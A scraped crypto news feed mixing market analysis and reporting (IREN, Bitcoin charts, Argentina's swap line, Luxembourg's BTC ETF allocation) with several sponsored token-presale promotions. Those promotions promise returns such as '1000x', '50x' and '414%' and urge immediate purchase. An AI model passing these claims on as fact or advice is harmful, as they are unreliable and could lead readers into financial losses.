caution. Despite my buy rating, which considers a multi-year timeframe of 3-5 years, I believe a near-term pullback is possible during the next earnings release, as all positives may already be priced in. On a valuation basis, the company is trading at a significant premium, as the excitement following the pivot from crypto mining to data center computing has driven the multiples up. On a P/E basis, the stock is trading at 154x earnings, which is expensive to say the least. That said, I would strongly consider adding this stock to my portfolio in any pullback. Q1 FY26 could be a catalyst for some traders to take profits, as the company has pretty much confirmed in a recent press release the ARR goals ($500M) for its AI cloud segment. Any small disappointment could lead to a selloff, which is the main reason I grade this stock as a speculative buy.",IREN,EN,0,0,BUSINESS|TRADING|ZRX|CRYPTOCURRENCY|MINING,"{'name': 'Seeking Alpha', 'img': 'https://images.cryptocompare.com/news/default/seekingalpha.png', 'lang': 'EN'}",seekingalpha,2025-10-10 09:39:37

Tapzi brings tokenization to gaming with skill-based, blockchain-backed rewards. Presale momentum: Tapzi is already 53% sold out. Backed by audits, KYC, and BlockDAG scalability, Tapzi positions itself as 2025’s breakout gaming token. Tokenization is rapidly emerging as one of the most disruptive forces in global finance. It promises to transform traditional money, financial instruments, and even real-world assets into programmable, transferable tokens that can be transferred instantly across digital rails. For years, this seemed like a distant dream. However, thanks to pilots from major players such as Chainlink, UBS, and Swift, tokenization is no longer theoretical. As these financial giants redefine how value can be settled across networks, an entirely different sector is preparing to leverage the same breakthrough: gaming. And at the front of that charge is Tapzi ($TAPZI) – the crypto presale that analysts, gamers, and investors are calling one of 2025’s most promising projects. Backed by transparent audits, real gameplay mechanics, and the scalability of BlockDAG technology, Tapzi aims to bridge entertainment and finance in ways that could transform both industries. The Tokenization Breakthrough That Could Change Everything The turning point came when Swift, UBS, and Chainlink ran a groundbreaking live trial . For years, fiat and crypto were considered rivals, often portrayed as locked in a zero-sum struggle. The pilot flipped the script: Swift successfully connected tokenized funds with traditional financial rails. Chainlink’s CCIP provided the bridge to enable seamless movement between networks. UBS demonstrated how assets could be minted and burned on demand, with no manual intervention required. This demonstrated that banks and blockchains could complement each other. Tokenization makes dollars, euros, and assets programmable, traceable, and instantly transferable, much like in-game currencies or NFTs. For Tapzi, this is the model: apply the same logic to gaming economies, where billions of dollars’ worth of player value is currently locked inside siloed platforms. Why Tapzi Could Be the Next 1000x Crypto Gaming has always been digital-first. From skins and achievements to virtual tokens, players have long created and exchanged value. However, until now, this value has remained trapped within centralized game servers, often disappearing when a player moved to another title or when the game shut down. Tapzi changes that equation with a token that’s not just a speculative presale asset – it underpins real skill-based gameplay. Players compete in chess, checkers, and other strategy games, staking tokens in battle arenas where winners are rewarded transparently. Unlike hype-driven meme coins, $TAPZI ties rewards to skill, performance, and real competition. With tokenization transforming the way banks view money, Tapzi brings the same principles to play. It transforms digital wins in ordinary games into tangible ownership with $TAPZI tokens, creating blockchain-native rewards that are directly connected to broader financial ecosystems. Roadmap: Trust, Transparency, and Utility One of the strongest differentiators for Tapzi is its emphasis on transparency—a rarity in the presale world. The team has taken multiple steps to build trust before its token even hits major exchanges: Audits : Tapzi scored above 90 in reviews from Coinsult and SolidProof. KYC compliance : The project holds Gold Tier verification under SolidProof . CertiK audit : A further audit from one of the most respected blockchain security firms is currently underway. But Tapzi’s roadmap doesn’t stop at compliance. Its vision includes: Skill-based staking : A system where players stake tokens in competitive battles, and winners claim pooled rewards. Marketplace integration : Secure trading of in-game items, giving players full control of digital assets. Cross-game interoperability : Designed for use across multiple titles, not restricted to a single closed ecosystem. Mobile-first access : Frictionless entry with no downloads or complicated wallet setups required. This user-first approach makes Tapzi far more accessible than many other gaming projects that struggle to bridge blockchain with mass-market appeal. The BlockDAG Advantage Tapzi’s ambitions require infrastructure that can scale. Traditional blockchains often struggle under high transaction loads – a problem that can significantly impact the experience in competitive gaming. Enter BlockDAG. By using a directed acyclic graph structure, transactions are processed in parallel rather than sequentially. The result is: High throughput : Perfect for multiplayer tournaments where thousands of transactions occur simultaneously. Instant micro-transactions : Players can tip, stake, and earn in real-time without waiting for block confirmations. Energy efficiency : Lower consumption compared to traditional chains, making adoption more sustainable. Gamers may never see the mechanics behind the scenes, but they’ll feel the difference in seamless gameplay. Investors, on the other hand, will recognize BlockDAG as the invisible engine that gives Tapzi its competitive edge. Real-World Scenarios: What Tapzi Could Deliver The potential applications are wide-ranging: Tradable assets: A player wins a rare NFT sword in Tapzi’s ecosystem. Instead of being locked in-game, it’s instantly tradable in open markets. E-sports tournaments: Prize pools are denominated in TAPZI tokens, and winners can cash out to fiat or swap across chains. Governance through staking: Players use their tokens not only to compete but to vote on new features, updates, and community rewards. This model aligns perfectly with the broader tokenization trend, where finance and entertainment converge into ecosystems that are transparent, decentralized, and player-driven. Like all crypto projects, Tapzi isn’t risk-free. Regulations surrounding gaming and tokenization are still being developed. Competition in play-to-earn markets is fierce, and volatility remains a constant presence in the landscape. However, Tapzi stands out by directly addressing these challenges. Its focus on compliance, detailed audits, and product-first roadmap gives it resilience and credibility that most presales teams lack. While no outcome is guaranteed, Tapzi has laid the groundwork for sustainable growth. Final Word: Tapzi as 2025’s Breakout Presale From traditional banking halls to gaming battle arenas, tokenization is rewriting the rules of more than one game. Swift, UBS, and Chainlink have already shown that finance is ready. Now, Tapzi is proving that gaming is next. This isn’t just another speculative presale. It’s a project with real gameplay mechanics, trusted audits, and scalable infrastructure. With its token still priced under a cent, early investors have the rare opportunity to be part of a platform before its breakout moment. Tapzi isn’t just surfing the tokenization wave – it’s steering it. Join Tapzi’s official $500,000 giveaway!

In recent cases, officials have seized millions of won in crypto holdings after tracing wallet activity linked to unpaid accounts. Wider Enforcement Systems Rolling Out Local governments are adopting systems that automatically identify and freeze wallets connected to tax delinquents. Under these programs, individuals who owe beyond certain thresholds can have their exchange-linked assets frozen or liquidated to recover outstanding liabilities. Cold Wallet Seizure Still Unclear While the systems are proven effective for exchange and custodial wallets, it remains unclear whether enforcement can extend to cold wallets —offline devices or paper wallets that store private keys locally. Such actions would likely require direct legal intervention or compelled disclosure from taxpayers. Policy Direction and Broader Context The seizure campaign forms part of South Korea’s broader effort to integrate digital assets into its tax framework.

Already having dipped just below $120,000, could this have been the bottom? The next horizontal support is at $118,000, but will the price get there? Break of trend is awaited Source: TradingView After making that all-time high at the beginning of the week, the $BTC price has kept the market salivating at the thought of a return to it, and a surge up to the next price level. In that vein of thought, this current retracement does look like a pause before the bulls are let loose again. In the 4-hour chart above, it can be seen that the price has been following a downward trend, with a decent-length candle wick to the downside that almost tagged the 0.382 Fibonacci level. It may be that this was indeed the local bottom. The first signs that this trend is about to change would be a break of the descending trendline in the price action with a confirmation above. This would likely be validated by the indicator lines in the Stochastic RSI crossing back up, and the indicator line in the RSI crossing up above its own downtrend line. Pros and cons of current inverse head and shoulders pattern Source: TradingView In the daily time frame it’s still all about the formation of an inverse head and shoulders pattern. The right shoulder looks relatively small, but this does not invalidate the pattern. In fact, this could just suggest that buyers are not allowing the price to fall further before they step in - a very bullish scenario. What will be important is to see a decisive close above the neckline with increased volume to validate the pattern. Just one point of concern to take note of is that generally the left and right shoulders should take a roughly similar amount of time to form. As it stands, if the $BTC price goes up to the neckline from here, this would mean that the right shoulder would have completely formed in the space of a week or so, while the left shoulder took over 4 weeks. This potentially much shorter formation period could suggest that there hasn’t been sufficient consolidation, possibly leading to a weaker breakout or an invalidation of the pattern. It’s now or never for Bitcoin Source: TradingView The above weekly chart for the $BTC price illustrates the whole of the bull market. It can be seen that higher highs and higher lows have continued throughout. The green arc shows the smooth parabolic movement of the price as the increase becomes steeper. Four touches of the 8-year ascending trendline have now been made in quick succession. This compares with the first touch at the top of the 2017 bull market, and one more touch during the 2021 bull market. The curve is rising into the trendline, and the space for the price action is narrowing. Yes, there could conceivably be a further slide in the price from here, but with the $BTC price resetting after becoming overbought, an oversold condition is now approaching. It’s now or never. There are only two ways for the price to go. To fall down through the parabolic curve and enter a bear market, or to break up beyond the ascending trendline and go into a potentially huge blow-off top, and final stage of the bull market.

Treasury Secretary Scott Bessent announced the deal on Thursday after four days of close discussions in Buenos Aires. “The US Treasury is prepared, immediately, to take whatever exceptional measures are warranted to provide stability to markets,” Bessent said in a statement on X. He added that the Treasury had “directly purchased Argentine pesos” as part of the program. Washington steps in to stabilize Argentina’s collapsing currency Argentina, led by Trump ally President Javier Milei, has been struggling with currency sell-offs in recent weeks. According to data from TradingEconomics, the Argentine peso weakened beyond 1,400 per USD this week, sliding back toward its record low of 1,475 reached on September 19. According to Bessent, the peso’s decline and shrinking central bank foreign reserves has left the country in a “moment of acute illiquidity.” The Treasury secretary explained that the swap line would give Argentina immediate access to US dollars in exchange for pesos. The two central banks will trade currencies temporarily to help Buenos Aires defend its exchange rate and meet short-term liquidity needs. Bessent admitted that if the peso’s value weakens during the swap period, it could expose the US to losses. However, the Treasury chief assured policymakers that the USD-Pesos swap was being executed through an Exchange Stabilization Fund that he directly oversees. Trump and Milei had discussed the plan during a meeting on the sidelines of the United Nations General Assembly in New York in September. The two leaders are scheduled to meet again in Washington on Tuesday to talk more about how America can aid Argentina’s ailing economy. “I continue to hear from American business leaders who, thanks to President Milei’s leadership, are eager to tie the American and Argentine economies more closely together,” Bessent continued, “The Trump administration is resolute in our support for allies of the United States.” He also lauded Buenos Aires for its “sound fiscal discipline” and commitment to lower taxes, higher private investment, and creation of employment opportunities. US support critical to calming down political uncertainty The US intervention comes at a time when markets are questioning Milei’s staying power and the sustainability of his reforms. Argentina’s central bank has been burning through its reserves to contain the peso’s fall, while inflation is edging above 150% annually. While details of the swap’s maturity period were not disclosed, officials familiar with the discussions said the agreement would be reviewed quarterly in coordination with the IMF and Argentina’s finance ministry. Milei, who came to power nearly two years ago, pledged to rescue Argentina’s chronically unstable economy by “exterminating” inflation and slashing government spending. His populist “chainsaw” approach won him support among voters wary of decades of mismanagement. However, the momentum behind Milei’s libertarian revolution has faltered in recent months. The president was in the middle of a cryptocurrency rug pull scandal involving LIBRA, but the anti-corruption office cleared his name, Cryptopolitan reported in February. In August, protests turned violent after Milei’s sister and chief of staff, Karina Milei, was implicated in a corruption scandal. The president was pelted with stones during one demonstration, and in the following month, Milei’s La Libertad Avanza party suffered defeat in the Buenos Aires provincial election, a region that accounts for nearly 40% of Argentina’s population. Last Sunday, one of his closest allies José Luis Espert, was forced to withdraw from the election, after he admitted he had received a $200,000 payment from an alleged drug trafficker.

As part of the University Blockchain Research Initiative (UBRI), Ripple has teamed up with Nanyang Technological University (NTU) in Singapore to develop an AI framework built directly into the XRP Ledger (XRPL) – a move that could redefine how smart agents operate within decentralized ecosystems. While XRP gains renewed attention from institutional players and long-term holders, retail investors are increasingly looking elsewhere for exponential upside – and MAGACOIN FINANCE has quickly emerged as their top pick. The trending altcoin is drawing massive interest ahead of its exchange listings, with experts predicting up to 50x returns as demand surges across the market. From Research to On-Chain Reality The collaboration between Ripple and NTU, led by Professor Yang Liu, initially began as a cybersecurity study aimed at improving code vulnerability detection using large language models. When traditional AI models failed to identify certain weaknesses, Liu’s team shifted to a more advanced concept – agentic AI, where autonomous agents think and act like human analysts. The real breakthrough came when these AI agents were connected directly to the XRP Ledger. This integration allowed the agents to execute tasks, process data, and settle results transparently on-chain, effectively making AI part of the ledger rather than a detached external tool. Ripple’s UBRI director Lauren Weymouth described the achievement as “academic innovation turned production-grade,” highlighting how the XRPL is evolving from a simple payment network into a dynamic, AI-integrated ecosystem capable of hosting self-operating applications. MAGACOIN FINANCE Gains Massive Momentum As XRP pushes the frontier of blockchain and AI integration, investors searching for the next high-growth opportunity are rallying around MAGACOIN FINANCE. The project has already raised over $16 million in its presale and continues to attract strong community engagement as it prepares for listings on major exchanges. Unlike typical presales driven by speculation, MAGACOIN FINANCE is backed by a solid ecosystem roadmap, combining innovative tokenomics, scalable technology, and a vision to become one of the leading community-driven assets in 2025. Analysts are calling it the best presale of the year, citing its early growth, expanding partnerships, and viral market presence. With a potential 50x upside, retail investors are viewing MAGACOIN FINANCE as a chance to capture early-stage gains similar to the legendary runs of DOGE and SHIBA, but with stronger fundamentals and a clearer long-term plan. Transparency, Utility, and Accountability Running AI natively on the XRP Ledger brings something most off-chain models lack – traceability. Every decision, action, or payment executed by these AI agents is permanently logged on-chain, creating full accountability and auditability. “The XRP Ledger gives AI a built-in trust layer,” explained Professor Liu. This transparency could prove crucial for sensitive applications, from automated cybersecurity auditing to financial compliance systems. Beyond security, Ripple’s vision extends to IoT coordination, liquidity management, and smart finance, where AI agents would autonomously manage tasks, optimize efficiency, and settle payments using XRP. It’s a glimpse into a future where AI-driven financial systems operate independently yet transparently within blockchain networks. The Challenge: Managing AI Risk Despite the promise, Liu’s team cautions that combining autonomous systems with real-world financial value brings new challenges. Agents can behave unpredictably when exposed to live markets, and ensuring they remain aligned with human intent is essential. To counter this, NTU is implementing guardrails and safety layers to prevent unwanted actions, block potential exploits, and maintain ethical decision-making. The next phase of development focuses on giving AI agents “memory” and reasoning skills, allowing them to learn from previous transactions and adapt dynamically to new situations. If successful, this evolution could turn the XRP Ledger into a self-improving, intelligent network where automation and trust coexist – a world where financial systems literally learn from themselves. The Future: Blockchain, AI, and the Next Big Wave Ripple’s new AI-on-blockchain framework signals a turning point not just for XRP but for the entire crypto sector. The merging of smart automation and decentralized finance could unlock a new era of intelligent systems that transact, verify, and evolve in real time. At the same time, the explosive rise of projects like MAGACOIN FINANCE highlights another truth – the crypto market’s constant hunger for innovation and opportunity. While XRP leads the technological charge, MAGACOIN FINANCE is capturing investor imagination, showing that 2025’s growth story may belong to those combining vision, scalability, and timing.

52936212,603181,1760090421,https://resources.cryptocompare.com/news/13/52936212.jpeg,Luxembourg Bets On Bitcoin As Sovereign Fund Adds 1% Exposure To BTC ETFs,https://bitcoinist.com/luxembourg-bitcoin-sovereign-fund-1-btc-etf/,"In an announcement made yesterday, Luxembourg’s Finance Minister disclosed that the European country’s Intergenerational Sovereign Wealth Fund (FSIL) is set to allocate 1% of its total portfolio to Bitcoin (BTC) exchange-traded funds (ETFs) and other cryptocurrencies. Luxembourg Wealth Fund Invests In Bitcoin In a major nod of approval for Bitcoin as a mainstream asset, Luxembourg’s FSIL is poised to invest as much as 1% of its total portfolio – worth slightly more than $9.5 million – into BTC ETFs and other digital assets. The development makes FSIL the first state-level Eurozone fund to invest in cryptocurrencies, a representative for the Agency for the Development of Luxembourg’s Financial Centre said. Bob Kieffer, Director of the Treasury, Luxembourg, said: Recognizing the growing maturity of this new asset class, and underlining Luxembourg’s leadership in digital finance, this investment is an application of the FSIL’s new investment policy, which was approved by the Government in July 2025. Although other European countries, such as Finland, Germany, and the UK, also hold a significant amount of BTC, most of those holdings stem from criminal seizures. Only Georgia holds 66 BTC exclusively for investment purposes, data from Bitbo shows. According to the latest data, the US continues to hold the highest amount of BTC among all countries around the world. The US is followed by China, UK, Ukraine, Bhutan, and El Salvador. Kieffer emphasized that the FSIL will not directly hold any BTC, citing “operational risks.” Instead, the fund has opted to gain indirect exposure to BTC through ETFs. He also said that 1% allocation strikes the right balance, sending the message about BTC’s long-term potential. It is worth highlighting that under the revised guidelines, the FSIL is authorized to invest as much as 15% of its total portfolio into “alternative investments,” including digital assets. As of June 2025, the FSIL held total assets worth nearly $730 million, most of it being high-quality bonds. Countries Ramping Up BTC Holdings While BTC accumulation was mostly limited to corporations until a few years back, countries like El Salvador spearheaded sovereign adoption of Bitcoin, igniting a trend that is now spreading across the world at a rapid pace. Notably, one of US President Donald Trump’s major campaign promises was to establish a strategic Bitcoin reserve. Senator Cynthia Lummis recently gave an update about the reserve, saying that it can “start anytime.” Several other countries have expressed willingness to establish their own strategic Bitcoin reserves. For instance, in May 2025, the Brazilian chief of staff to the Vice President reaffirmed plans to add BTC to the country’s sovereign reserves. Similarly, India’s ruling party BJP’s spokesperson, called for a strategic Bitcoin reserve pilot in July. At press time, BTC trades at $120,809, down 2.5% in the past 24 hours.",Bitcoin News|bitcoin|Bitcoin Adoption|bitcoin ETF|btc|BTCUSDT|crypto|Cryptocurrency|digital asset|Eurozone|FSIL|Luxembourg|Strategic Bitcoin Reserve,EN,0,0,CRYPTOCURRENCY|BTC|FIAT|REGULATION|ASIA,"{'name': 'Bitcoinist', 'img': 'https://images.cryptocompare.com/news/default/bitcoinist.png', 'lang': 'EN'}",bitcoinist,2025-10-10 10:00:21

Bitcoin Mega Whales Have Continued To Sell During This Rally According to the latest weekly report from Glassnode, the Bitcoin Accumulation Trend Score suggests a resurgence in buying among the investors. This on-chain indicator basically tells us whether the BTC holders are buying or selling. The metric calculates its value by not only looking at the balance changes happening in the wallets of the investors, but also accounting for the size of the wallets themselves. This means that the behavior of the larger entities has a larger influence on the score. Related Reading: Bitcoin’s Rally Still Looks Intact, CryptoQuant Says: Here’s Why When the value of the indicator is above 0.5, it implies the large investors (or alternatively, a large number of small hands) are participating in accumulation. The closer is the indicator to 1, the stronger is this behavior. On the other hand, the metric being under the threshold suggests distribution is the dominant behavior among BTC holders. The zero mark serves as the extreme level for this side of the scale. Now, here’s the chart shared by Glassnode in the report that shows the trend in the Bitcoin Accumulation Trend Score separately for the various investor cohorts: As displayed in the above graph, the Bitcoin Accumulation Trend Score assumed a neutral-distribution value across the market in mid-September, but a shift has occurred recently. The sharks, investors holding between 100 to 1,000 BTC, were the first to pivot to buying. And it wasn’t just any degree of accumulation, but a strong one, with the metric sitting close to 1. The 10 to 100 BTC cohort followed soon after, though its Accumulation Trend Score has still not achieved a value as high as the sharks’. Together, the buying from these mid-sized holders appears to be what backed the recent price surge to a new all-time high (ATH). Very recently, the retail investors (below 1 BTC and 1 to 10 BTC groups) have also embraced accumulation, potentially attracted by the hype of the Bitcoin bull run. While sharks and smaller entities have been accumulating, the top end of the scale has shown a different behavior. The whales (1,000 to 10,000 BTC) have continued to hold a neutral behavior, neither buying nor selling, while the largest of entities on the network, those holding above 10,000 BTC, have been in stark contrast to the sharks with their Accumulation Trend Score sitting deep in the distribution zone. Related Reading: XRP Could Retest Triangle Support At $2.72, Analyst Warns It now remains to be seen how long these Bitcoin holders, popularly called the mega whales, will continue their selloff, and whether they will provide impedance to the run.

52936169,https://timestabloid.com/?p=85896,1760090431,https://resources.cryptocompare.com/news/67/default.png,Why Peter Brandt is Convinced XRP Will Tank Another 20% and The Top Crypto Challenging Ripple Dominance,https://timestabloid.com/why-peter-brandt-is-convinced-xrp-will-tank-another-20-and-the-top/,"Veteran trader Peter Brandt has issued a stark warning on XRP prices, predicting a potential 20% plunge if key support levels break. This bearish call emerges amid rising altcoin market capitalization, which recently touched $1.19 trillion. Brandt spots a descending triangle pattern on crypto charts, a classic sign of downtrend persistence drawn from technical analysis classics. Consequently, XRP hovers near $2.85, vulnerable to sharper drops. Meanwhile, the top crypto challenging Ripple dominance, Mutuum Finance (MUTM) , gains traction through its DeFi innovations. Investors eye this shift as crypto prices fluctuate wildly. Furthermore, negative sentiment data underscores risks for XRP, while MUTM’s presale surges forward. Brandt’s Bearish Stance on XRP Intensifies Peter Brandt has scrutinized XRP’s price structure closely. He highlights a developing descending triangle on the charts. This pattern often foreshadows continued declines in crypto prices. Brandt cautions that a close below $2.68743 could trigger a slide to $2.22163. Such a move would erase over 20% from current levels around $2.85. Moreover, broader market signals align with this crypto crash outlook. Santiment data reveals negative sentiment toward XRP at its highest in six months. Yet, contrarian views suggest rebounds follow such lows historically. Still, Google Trends shows search interest for XRP dipping to a three-month nadir below 25 points. In addition, mid-level holders have begun offloading positions. Wallets with 1 million to 10 million XRP accumulated supply from 6% last October to 10.76% in September. Now, that share slips back to 10%. This distribution hints at profit-taking or waning confidence. Consequently, selling pressure mounts on XRP amid volatile crypto prices. Furthermore, these factors amplify Brandt’s crypto predictions of downside. Mid-tier investors control substantial circulating supply. Their actions sway trends sharply. As crypto prices today reflect broader unease, XRP faces heightened scrutiny. Investors ponder if this crypto crash today marks a turning point or deeper trough. Mutuum Finance Gains Ground in DeFi Space Mutuum Finance (MUTM) has positioned itself as a formidable challenger to Ripple’s hold. The project builds a decentralized lending and borrowing protocol on Ethereum. Users earn yields on idle assets or borrow against holdings without losing custody. This utility drives demand in the crypto market. Phase 6 of the presale is underway now, filling at 60% capacity out of 11 phases. Investors have raised $17,050,000 since the start. Total MUTM holders stand at 16,830. The current price sits at $0.035, a 250% rise from phase one’s $0.01. Moreover, phase 6 sells out fast. The window to acquire tokens this affordably closes soon. Phase 7 follows with a 14.3% hike to $0.04. At launch, MUTM reaches $0.06, offering current buyers a 414% return. Furthermore, Mutuum Finance has announced its lending and borrowing protocol development. Version 1 deploys to Sepolia Testnet in Q4 2025. Core features include liquidity pools, mtTokens, debt tokens, and liquidator bots. Initial assets cover ETH and USDT for lending, borrowing, and collateral. Presale Surge Highlights Investment Appeal The team has finalized its Certik audit successfully. Mutuum’s token scan earned a 90/100 score, signaling robust security. Additionally, Mutuum Finance launched a Bug Bounty Program with CertiK. It allocates $50,000 USDT for rewards across four tiers: critical, major, minor, and low. Every vulnerability level earns compensation. In parallel, the MUTM team introduced a dashboard featuring a leaderboard for the top 50 holders. These leaders receive bonus tokens as rewards for maintaining positions. Moreover, excitement builds around the latest giveaway. Mutuum Finance offers $100,000 in MUTM prizes, divided among 10 winners at $10,000 each. Participants submit wallet addresses, complete quests, and invest at least $50 in the presale to qualify. This crypto investment draws eyes for its practical use cases. Lenders deposit assets like USDC and earn mtTokens that accrue interest. Borrowers post overcollateralized holdings to access funds instantly. Rates adjust via utilization, keeping liquidity balanced. When supply abounds, rates stay low to spur borrowing. Scarcity prompts hikes, drawing deposits. Protocol Safeguards Bolster Confidence Mutuum employs deposit and borrow caps to curb risks. These limits prevent excessive exposure to illiquid tokens. Overcollateralization ensures positions withstand price swings. Liquidation triggers activate if collateral dips below thresholds, with bonuses incentivizing swift resolutions. Furthermore, loan-to-value ratios cap borrowings at safe levels, like 75% for stable assets. Reserve factors collect interest slices for protocol buffers. Chainlink oracles provide timely price feeds, backed by fallbacks for reliability. These mechanics foster secure crypto investing. As volatility grips the market, Mutuum’s design promotes stability. Enhanced collateral efficiency links correlated assets for better yields. Stable rate options offer predictability, though at premiums. Rebalancing maintains fairness during shifts. Weighing XRP Risks Against MUTM Opportunities Brandt’s conviction on XRP’s 20% tank underscores crypto crash vulnerabilities. Yet, Mutuum Finance (MUTM) emerges as the top crypto challenging Ripple dominance through tangible DeFi tools. Investors navigate these crypto predictions by favoring utility-driven projects. Consider joining the MUTM presale today to secure your stake in this evolving space.

October 10, 2025 • 10:00 UTC Solana might pump soon – partly thanks to Jupiter’s native stablecoin release . The biggest Solana DEX will launch JupUSD in a $304B-strong market, putting Solana in the spotlight. Traders will need $SOL to pay for gas fees for all JupUSD transactions. And as per DefiLlama, Jupiter had a $20B trading volume in the last month . The stablecoin market itself has been exploding these past few years – +132% since January 2024 and almost 49% since the beginning of 2025. Solana price predictions are promising bigger gains soon – possibly to $320 and beyond . But the true opportunity might lie elsewhere. Snorter Token ($SNORT) is the native token of an upcoming Solana trading bot: the self-acclaimed cheapest and fastest Solana trading bot. Our $SNORT price prediction forecasts a $0.94 price point by the end of 2025, which is a potential 774% increase from the current$ $0.1075 price. Here’s how to buy Snorter Token right away. Fundstrat Predicts Ethereum to Hit $5.5K Soon as PEPENODE Might Become Next Crypto to Explode October 10, 2025 • 10:00 UTC Fundstrat is saying that Ethereum could fall to $4.2K and then jump to $5.5K in Q4. I do not make much of Crypto weakness in recent days, and expect $ETHUSD likely bottoms out over the next 1-2 days before heading back higher and rallies to $5500. —Fundstrat Global Advisors Managing Director Mark Newton, X Post Ethereum peaked at $4.7K recently, followed by a dump. The asset is now at $4.3K but Community Sentiment is 82% positive on CoinMarketCap . Benjamin Cowen (crypto analyst) said that the volatile price action will continue until ‘the bull market support band catches up’ and that this might take several weeks. With overwhelming positive sentiment (retail and institutional) surrounding $ETH, we could see an altcoin rally follow soon. And this brings us to a promising altcoin – PEPENODE ($PEPENODE) , which brings affordable and rewarding virtual mining to crypto. Think of building your own virtual mining rig in a gamified environment where you build a mining empire of nodes. And rewards galore, of course. The presale has raised $1.7M, and $PEPENODE buyers get 724% staking APY now. With a token price of $0.0010962, this is one altcoin you don’t want to miss. Here’s how to buy PEPENODE now.

In 2010, Bitcoin was worth a few cents. One year later, it hit $20. In six years, it was $17,000, and now it’s sitting at over $110K, after hitting an ATH of $123K in July. Historically, if you’d invested in Bitcoin at launch, you’d have an ROI of 188,643,000%. The likes of Mastercard, JP Morgan, and scores of S&P 500 companies are buying Bitcoin in droves. There’s never been anything like Bitcoin before, and investors are waking up to that reality. However, Bitcoin is getting old for modern standards. No dApps, no smart contracts, and almost non-existent DeFi scalability. It needs an upgrade. And that’s what Bitcoin Hyper ($HYPER) is here to do with Layer-2 technology. Click to learn more about Bitcoin Hyper Bitcoin Hyper ($HYPER) is a crypto project planning to launch the fastest Layer-2 chain for Bitcoin. Its goal – to bring Bitcoin’s blockchain to modern standards. This means compatibility with dApps, smart contracts, and seamless DeFi programmability for developers. The L2 will run on a Canonical Bridge, combined with the Solana Virtual Machine (SVM), for native compatibility with Solana. You’ll be able to build token programs, LP logic, oracles, games, NFT infrastructure, DAOs, and much more. All without reinventing the wheel. To engage with the L2, you’ll deposit $BTC to a designated address monitored by the Canonical Bridge. The Relay Program verifies the details, and then mints an equivalent number of wrapped $BTC on the L2. You can also withdraw your original $BTC at any time. If you’re looking for the newest insights on Bitcoin and Bitcoin Hyper, you’re in the right place.

HOW TO BUY $HYPER Today’s Bitcoin Technical Analysis Bitcoin could be preparing for its next leg up. Yesterday’s daily candle closed above the 10 EMA, completing the token’s much-awaited retest after it surged nearly 16% and hit a new all-time high last week. Today’s price action so far has been mostly sideways, further confirming that the token may be gathering momentum before potentially breaking higher again. Even with this retest, though, Bitcoin has only pulled back slightly. Technically speaking, its current pullback hasn’t even touched the 0.5 Fibonacci level drawn from the most recent swing low at $108K. This simply means that a deeper pullback could be on the cards. That said, Bitcoin is no stranger to one-sided rallies, and if the 2020-2021 action is anything to go by, BTC could hit $265K by year-end itself . Bitcoin Maintains $120K Level Despite Profit Selling: Traders Rotate to Bitcoin Hyper October 10, 2025 • 10:00 UTC A Glassnode report claims that $BTC holders have accumulated between 10 and 1,000 $BTC in the last few weeks. And a significant portion of whales hold $BTC at the $117K–$120K level, so there’s structural support there. This is the likeliest reason why Bitcoin held strong at $120K ( now at $121.6K ). Farside Investors data also shows that US spot ETF inflows are nearing $5B this month . Futures OI is also peaking, which leads to leveraged long positions and builds up to a bigger rally. All of this means one thing – there’s promise in the crypto market this month. And Bitcoin-centric altcoins like Bitcoin Hyper ($HYPER) have the most potential in the current market. $HYPER is working on a Layer-2 for Bitcoin to solve its biggest problems – low speed (capped at 7 TPS) and lack of support for dApps and smart contracts. Both issues are crippling for modern DeFi demands, and solving them would literally give Bitcoin wings. That’s why traders are so hyped about Bitcoin Hyper (a whale bought $11.3K in the last day ). See what Bitcoin Hyper is in our guide. New $110K Bitcoin Bottom Confirmed, Traders Should Up Expectations for 2025: Bitcoin Hyper Ready to Ride the Rally October 10, 2025 • 10:00 UTC Crypto analyst James Check said that $110K is now Bitcoin’s new bottom . This is fundamentally a bullish signal, as traders should expect higher price points going forward (and less downside volatility). He further said that ‘the bulls are in control’ now, which Capriole Investments founder Charles Edward echoed with his $150K prediction. A ‘very quick’ breakout may occur after $BTC passed the $120K psychological level. Right now, $BTC is at $121.1K , and the 24h trading volume spiked by 28%. With a potential Bitcoin rally coming soon, traders are betting everything on one promising altcoin – Bitcoin Hyper ($HYPER) . The project plans to scale Bitcoin to 2025 standards – much higher transaction speed, dApp support, smart contract programmability, and ample token holder rewards. $HYPER’s presale is one of 2025’s most successful, having raised over $22.9M and whales adding over $1M last week. Here’s a comprehensive guide on Bitcoin Hyper.

In a video shared on X by crypto proponent John Squire (@TheCryptoSquire), Sal Gilbertie, president of Teucrium, discussed his firm’s move into cryptocurrency products, explaining how the company identified a new opportunity in the XRP market. Increasing Crypto Exposure Gilbertie explained that Teucrium had previously filed for Bitcoin-related products and maintained ongoing interests in cryptocurrency. He described himself as “an XRP enthusiast,” noting that the company’s leveraged XRP ETF was designed to meet investor demand while managing exposure through derivatives. The move reflects Teucrium’s effort to expand its ETF lineup beyond traditional commodities into the digital asset space. While the firm has been known for its agricultural and futures-based ETFs, Gilbertie’s comments show that Teucrium is now positioning itself to serve investors seeking exposure to cryptocurrencies in a regulated format. “We’re not holding XRP itself,” he said, emphasizing that the product focuses on leveraging XRP-linked derivatives rather than direct ownership of the token. The fund’s launch was met with immediate interest, and Gilbertie previously revealed that it was the most successful ETF launch in the company’s history . Sal Gilbertie, President of Teucrium Trading, just said it himself: “I’m an $XRP enthusiast.” When Wall Street veterans start speaking like that… you know what’s coming. pic.twitter.com/KYA9LvAU8F — John Squire (@TheCryptoSquire) October 8, 2025 Shaping the Future of Finance During the conversation, Gilbertie offered insight into how he views the broader digital asset landscape. He noted that identifying the next successful cryptocurrency would not be straightforward, describing it as “harder than people think.” Rather than focusing on picking specific tokens, he believes the next phase of growth will come from recognizing how blockchain technology reshapes business operations. “This really is the Internet in the 1990s,” he said, characterizing the current stage of crypto innovation as a period of foundational transformation. We are on X, follow us to connect with us :- @TimesTabloid1 — TimesTabloid (@TimesTabloid1) June 15, 2025 Gilbertie also suggested that companies integrating blockchain technologies could represent the next major opportunity for investors. This statement is notable because Gilbertie has previously spoken about XRP overthrowing SWIFT , and reshaping the international payment space could put XRP at the forefront of the next phase of cryptocurrency growth. Institutional Interest Gains Momentum The interview showed a key change in sentiment among traditional finance executives. Teucrium’s leadership entering the crypto ETF field demonstrates an increased willingness to align with investor demand for exposure to digital assets. As firms like Teucrium explore more regulated ways to provide access to digital assets, the distinction between traditional finance and the crypto economy continues to narrow. For now, Gilbertie’s public support of XRP and his company’s rapid success with its leveraged ETF product suggest that institutional participation in the XRP ecosystem is moving from cautious experimentation to active expansion.

